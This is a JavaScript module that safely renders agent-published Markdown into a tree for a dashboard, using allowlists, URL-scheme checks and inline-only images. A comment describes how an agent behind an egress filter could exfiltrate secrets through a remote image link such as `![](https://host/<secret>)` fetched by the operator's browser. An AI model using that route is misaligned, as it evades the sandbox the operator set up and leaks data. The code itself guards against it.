// Markdown source → a plain document tree, with no Preact and no DOM.
//
// The dashboard never asks markdown-it for an HTML string, and so never has an
// HTML string to inject. markdown-it parses (with its own HTML support off) to
// a token stream; this module walks that stream into `{ tag, attrs, children }`
// nodes drawn from the allowlists below, and markdown-document.js turns those
// into Preact vnodes. Text from an agent-published file therefore reaches the
// DOM only as a text node or as an attribute value that passed a check here.
// No markup string is built or assigned anywhere on the path, which is why the
// Markdown viewer needs no imperative-boundary exemption.
//
// Keeping the walk free of Preact is also what lets jstest exercise it
// directly, without a DOM.

// markdown-it is ~130 KiB of parser that only a notification carrying a
// Markdown file ever needs, so it is imported on demand rather than pulled into
// the dashboard's boot graph. The import map in dashboard.html resolves the
// bare specifier to the vendored module. One parser is shared by every viewer.
let parserPromise = null;

export function loadMarkdownParser() {
  if (!parserPromise) {
    parserPromise = import('markdown-it').then(({ default: MarkdownIt }) => new MarkdownIt({
      // html:false is load-bearing, not a preference: it makes markdown-it emit
      // raw HTML in the source as text tokens instead of markup tokens, so an
      // agent cannot smuggle an element past the allowlists below.
      html: false,
      // Bare URLs in an agent's document become links, matching how the plain
      // notification body already treats them.
      linkify: true,
      typographer: false,
      breaks: false,
    })).catch((error) => {
      // A failed load must not poison every later open: the next viewer retries.
      parserPromise = null;
      throw error;
    });
  }
  return parserPromise;
}

// Elements the viewer will build. This is what markdown-it's default preset
// (CommonMark plus tables and strikethrough) can produce, and nothing else — an
// unlisted tag is dropped and its children are kept, so a future parser option
// degrades to unstyled content rather than to markup we never reviewed.
const ALLOWED_TAGS = new Set([
  'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'hr', 'br',
  'ul', 'ol', 'li', 'pre', 'code', 'em', 'strong', 's', 'a', 'img',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
]);

// The only schemes an anchor may carry, and only spelled absolutely (see
// safeURL). markdown-it's own validateLink already rejects javascript:,
// vbscript: and file:, but the viewer does not rely on a parser option for the
// property that matters most here.
const LINK_SCHEMES = new Set(['http:', 'https:', 'mailto:']);

// An image may ONLY come from a self-contained data: URI, restricted to the
// raster types the notification image preview already trusts. No SVG: it
// carries script.
//
// This is the one place the viewer is deliberately stricter than a general
// Markdown renderer, and the reason is specific to what tclaude is. An <img>
// is the only thing in a document that reaches the network on its own, with no
// click — and the document's author is an agent that may be running behind
// this project's own egress boundary (see docs/linux-network-filtering.md:
// default-drop nftables plus a DNS broker admitting only authored names). A
// remote src would let such an agent write `![](https://host/<secret>)`, wait
// for the operator to open the report, and have the operator's UNFILTERED
// browser make the request the agent could not — turning the viewer into a
// way around the sandbox the operator configured. `referrerpolicy` does not
// help: it hides which host asked, not that the request happened at all.
//
// Inline data: images keep documents genuinely illustrated while staying
// local, which is the same offline property the vendored parser exists for. A
// remote image degrades to its alt text (see imageNode).
const DATA_IMAGE = /^data:image\/(?:gif|png|jpeg|webp);base64,[a-z0-9+/]+=*$/i;

// Table-cell alignment is the one inline style markdown-it emits.
const TEXT_ALIGN = /^text-align:\s*(?:left|center|right)$/i;

// Fence languages become a class the stylesheet can hook, with the language
// name reduced to the characters an informative label needs.
const LANGUAGE_CLASS = /^language-[a-z0-9_.+-]{1,32}$/i;

function safeURL(value, { image = false } = {}) {
  const raw = String(value ?? '').trim();
  if (!raw) return null;
  // An image source is inline or it is nothing — no scheme parsing, because no
  // scheme is acceptable. A relative src is refused for the same reason a
  // relative href is, with the extra weight that an image would fetch it
  // against the dashboard's own origin without the operator clicking anything.
  if (image) return DATA_IMAGE.test(raw) ? raw : null;
  let parsed;
  try {
    // Parsed with NO base, so only an absolute URL naming its own scheme
    // survives. That rejects javascript:, data: and file: by scheme, and
    // rejects the relative forms — `./notes.md`, `/api/x`, `#section`,
    // `//host/y` — for a different reason: the author meant them to resolve
    // against their own repository, and the only thing they can actually
    // resolve against here is the dashboard's origin. A link that would
    // silently retarget at the operator's own daemon is worse than no link.
    parsed = new URL(raw);
  } catch {
    return null;
  }
  return LINK_SCHEMES.has(parsed.protocol) ? raw : null;
}

// attributesFor keeps only what each element is allowed to carry, and checks
// the value rather than trusting it. Everything markdown-it produces that is
// not listed is dropped.
function attributesFor(tag, attrs) {
  const source = new Map((attrs || []).map(([name, value]) => [String(name).toLowerCase(), value]));
  const out = {};
  const title = source.get('title');
  if (title) out.title = String(title);

  if (tag === 'a') {
    const href = safeURL(source.get('href'));
    if (!href) return out;
    out.href = href;
    // A document's links leave the dashboard, so they open in a new context
    // and are denied a handle back to this one.
    out.target = '_blank';
    out.rel = 'noopener noreferrer';
    return out;
  }
  if (tag === 'img') {
    // Inline-only by policy (see DATA_IMAGE), so the src never reaches the
    // network and carries no referrer to suppress.
    const src = safeURL(source.get('src'), { image: true });
    if (!src) return out;
    out.src = src;
    out.loading = 'lazy';
    return out;
  }
  if (tag === 'ol') {
    const start = Number.parseInt(source.get('start'), 10);
    if (Number.isInteger(start) && start > 0) out.start = start;
    return out;
  }
  if (tag === 'th' || tag === 'td') {
    const style = String(source.get('style') ?? '');
    if (TEXT_ALIGN.test(style)) out.style = style;
    return out;
  }
  if (tag === 'code') {
    const className = String(source.get('class') ?? '');
    if (LANGUAGE_CLASS.test(className)) out.class = className;
    return out;
  }
  return out;
}

function element(tag, attrs, children = []) {
  return { tag, attrs, children };
}

// An image's alt text is a nested inline token stream in markdown-it, not the
// (always empty) alt attribute, so flatten it to the characters it describes.
function inlineText(tokens) {
  return tokens.map((token) => {
    if (token.children?.length) return inlineText(token.children);
    if (token.type === 'softbreak' || token.type === 'hardbreak') return ' ';
    return token.content || '';
  }).join('');
}

// image is the one leaf element whose target can be refused. An image the
// viewer will not load is worth less than the words the author wrote about it,
// so a rejected src degrades to the alt text rather than to a broken icon.
function imageNode(token) {
  const attrs = attributesFor('img', token.attrs);
  const alt = inlineText(token.children || []);
  if (!attrs.src) return alt;
  return element('img', { ...attrs, alt }, []);
}

function codeBlock(token) {
  // token.info is the fence's info string ("js", "bash args…"); its first word
  // is the language. attributesFor re-checks the class it becomes.
  const language = String(token.info || '').trim().split(/\s+/)[0];
  const attrs = language ? [['class', `language-${language}`]] : [];
  return element('pre', {}, [element('code', attributesFor('code', attrs), [token.content])]);
}

// walk turns one token list into nodes. markdown-it emits a flat stream where
// container elements are an opening token (nesting 1) and a closing token
// (nesting -1) around their content, so the walk keeps a stack of open
// elements. `inline` tokens carry their own child stream.
function walk(tokens) {
  const root = element(null, {}, []);
  const stack = [root];
  const top = () => stack[stack.length - 1];

  for (const token of tokens) {
    switch (token.type) {
      case 'inline':
        // Appended one at a time rather than spread: a single paragraph of a
        // large document can carry more inline nodes than an argument list
        // holds, and blowing the stack would lose the whole document.
        for (const node of walk(token.children || [])) top().children.push(node);
        continue;
      case 'text':
        if (token.content) top().children.push(token.content);
        continue;
      // With html:false these two cannot occur. Handling them as text anyway
      // means that if a future option ever turns markdown-it's HTML support
      // back on, the markup is displayed rather than honoured.
      case 'html_block':
      case 'html_inline':
        if (token.content) top().children.push(token.content);
        continue;
      case 'code_inline':
        top().children.push(element('code', {}, [token.content]));
        continue;
      case 'image':
        top().children.push(imageNode(token));
        continue;
      case 'fence':
      case 'code_block':
        top().children.push(codeBlock(token));
        continue;
      case 'softbreak':
        top().children.push('\n');
        continue;
      case 'hardbreak':
        top().children.push(element('br', {}, []));
        continue;
      default:
        break;
    }
    if (token.hidden) continue;

    const tag = String(token.tag || '').toLowerCase();
    const allowed = ALLOWED_TAGS.has(tag);
    if (token.nesting === 1) {
      const attrs = allowed ? attributesFor(tag, token.attrs) : null;
      // Two ways to end up transparent: a container this walk does not build at
      // all, and an anchor whose target was refused. An anchor with no href is
      // not a link, and leaving one behind would render as link-coloured text
      // that silently does nothing when the operator clicks it — so the words
      // survive and the anchor does not, the same way a refused image degrades
      // to its alt text. Pushing the current top again keeps the stack balanced
      // against the closing token either way.
      if (!allowed || (tag === 'a' && !attrs.href)) {
        stack.push(top());
        continue;
      }
      const node = element(tag, attrs, []);
      top().children.push(node);
      stack.push(node);
    } else if (token.nesting === -1) {
      if (stack.length > 1) stack.pop();
    } else if (allowed) {
      top().children.push(element(tag, attributesFor(tag, token.attrs), []));
    }
  }
  return root.children;
}

// markdownToTree parses Markdown source into the viewer's document tree. Nodes
// are `{ tag, attrs, children }`; a child that is a string is literal text.
export function markdownToTree(parser, source) {
  // A leading byte-order mark is legal in a UTF-8 file and the daemon's sniff
  // accepts one, but markdown-it does not strip it — left in place it glues
  // itself to the first `#` and turns the document's title into a paragraph.
  const text = String(source ?? '').replace(/^\uFEFF/, '');
  if (!text.trim()) return [];
  return walk(parser.parse(text, {}));
}
